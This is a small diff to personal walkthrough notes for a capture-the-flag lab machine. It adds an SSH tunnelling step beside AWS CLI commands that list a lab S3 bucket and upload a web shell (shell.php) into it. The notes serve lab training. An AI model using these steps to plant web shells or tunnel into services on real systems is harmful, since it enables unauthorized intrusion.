@@ -50,3 +50,6 @@
  - aws --endpoint=http://s3.thetoppers.htb s3 ls
  - aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
  - `aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb` to upload
+
+### SSH tunneling
+ - `ssh -L 1234:localhost:5432 christine@{target_IP}` locally we will be listening to 1234
